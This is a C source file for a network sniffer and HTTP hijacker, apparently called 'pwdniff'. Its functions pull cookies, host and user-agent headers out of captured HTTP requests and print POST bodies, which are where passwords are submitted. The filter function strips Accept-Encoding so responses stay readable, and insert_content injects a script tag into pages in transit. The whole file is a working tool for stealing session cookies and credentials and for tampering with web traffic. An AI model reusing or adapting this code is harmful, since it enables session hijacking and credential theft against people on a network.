#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include "common.h"
#include "pwdniff.h"

bool	http_header_record[HEADER_RECORD_NUM];
int		record_len;

void pwdniff_init()
{
	int i = 0;
	
	for(i = 0;i < HEADER_RECORD_NUM;++i){
		http_header_record[i] = false;
	}
	
	record_len = 0;
}

//return length of actually data
void insert_content(char *head, char *str)
{
	uint len = strlen(str);
	char *front_annotate = strstr(head, "<!--");
	
	if(front_annotate){
		char	*end_annotate = strstr(front_annotate, "-->");
		
		if(end_annotate > front_annotate){
			uint	padding = end_annotate - front_annotate + 3;
			
			if(padding >= len){
				memcpy(front_annotate, str, len);
				memset(front_annotate + len, 0x20, padding - len);
				
				printf("hijacked!\n");
			}
		}
	}
}

uint eleminate_header(char *head, uint datalen, char *str)
{
	char *plaintext = "identity\r\n";
	uint len = 0;
	char *point = strstr(head, str);
	
	if(point){
		char *br = strstr(point, "\r\n");
		char *start = point + strlen(str);
		
		if(start < br){
			len = br - start;
			memmove(start, br, datalen - (br - head));
			
			printf("eleminate_header:%s\n", str);
		}
		
		/*
		if(br){
			len = br - point + 2;
			uint gzip_len = len - strlen(str);
			uint plain_len = strlen(plaintext);
			char *start = point + strlen(str);
			
			if(gzip_len >= plain_len){
				memmove(start + plain_len, br + 2, datalen - (point - head) - len);
				memcpy(start, plaintext, plain_len);
			}else{
				len = 0;//never mind
			}
			
			memmove(point, point + len, datalen - (point - head) - len);
		}*/
	}
	
	return datalen - len;
}

uint delete_header(char *head, uint datalen, char *pattern)
{
	uint len = 0;
	char *point = strstr(head, pattern);
	
	if(point){
		char *br = strstr(point, "\r\n");
		
		len = br + 2 - point;
		
		memmove(point, br + 2, datalen - (br + 2 - head));
		
		printf("delete_header:%s\n", pattern);
	}
	
	return datalen - len;
}

bool http_request_check(char *data)
{
	if((data[0] == 'G' && data[1] == 'E' && data[2] == 'T') || 
		(data[0] = 'P' && data[1] == 'O' && data[2] == 'S' && data[3] == 'T')){
		return true;
	}
	
	return false;
}

void printf_post_request(char *post, char *head)
{
	if(post){
		char	*content_length = strstr(head, "Content-Length: ");
		
		if(content_length){
			char	*br_content_length = strstr(content_length, "\r\n");
			
			if(br_content_length > content_length){
				int		body_len = 0;
				char	*request_end = strstr(br_content_length, "\r\n\r\n");
				
				content_length += strlen("Content-Length: ");
				br_content_length[0] = '\0';
				
				body_len = atoi(content_length);
				
				if(request_end){
					char	*body = request_end + 4;
					int		i = 0;
					
					printf("body_len:%d\n", body_len);
					
					for(i = 0;i < body_len;++i){
						if(body[i] == '&'){
							putchar('\n');
						}else{
							putchar(body[i]);
						}
					}
				}
			}
		}
	}
}

void sniff_http_header(char *head, uint datalen)
{
	char		*cookie = strstr(head, "Cookie: ");
	char		*host = strstr(head, "Host: ");
	char		*useragent = strstr(head, "User-Agent: ");
	char		*get = strstr(head, "GET ");
	char		*post = strstr(head, "POST ");
	char		*request = get ? : post;
	
	if(cookie && host && useragent && request){
		
		char	*br_cookie = strstr(cookie, "\r\n");
		char	*br_host = strstr(host, "\r\n");
		char	*br_useragent = strstr(useragent, "\r\n");
		char	*first0d0a = strstr(head, "\r\n");
		
		if(br_cookie && br_host && br_useragent && first0d0a){
			
			struct http_header			header;
			
			memset(&header, 0x0, sizeof(header));
			
			header.host_len = br_host - host;
			header.useragent_len = br_useragent - useragent;
			header.cookie_len = br_cookie - cookie;
			header.addr_len = first0d0a - request;
			
			memcpy(header.addr, request, header.addr_len <= ADDR_LEN ? header.addr_len : ADDR_LEN);
			memcpy(header.host, host, header.host_len <= HOST_LEN ? header.host_len : HOST_LEN);
			memcpy(header.useragent, useragent, header.useragent_len <= USERAGENT_LEN ? header.useragent_len : USERAGENT_LEN);
			memcpy(header.cookie, cookie, header.cookie_len <= COOKIE_LEN ? header.cookie_len : COOKIE_LEN);
			
			ushort hash = csum((unsigned short *)&header, sizeof(header)) & HEADER_RECORD_NUM;
			
			//if(http_header_record[hash] == false){
				
				printf("%s\n", header.addr);
				printf("%s\n", header.host);
				printf("%s\n", header.useragent);
				printf("%s\n", header.cookie);
				printf("addr_len:%d\n", header.addr_len);
				printf("host_len:%d\n", header.host_len);
				printf("useragent_len:%d\n", header.useragent_len);
				printf("cookie_len:%d\n", header.cookie_len);
				printf_post_request(post, head);
				
				printf("\n\n");
				
				http_header_record[hash] = true;
				record_len++;
			//}
			
		}
		
	}
}

uint filter(char *head, uint datalen)
{
	insert_content(head, "<script>alert('hijack lalalalalalalala')</script>");
	
	datalen = eleminate_header(head, datalen, "Accept-Encoding: ");
	
	//datalen = delete_header(head, datalen, "If-Modified-Since: ");
	//datalen = delete_header(head, datalen, "If-None-Match: ");
	
	return datalen;
}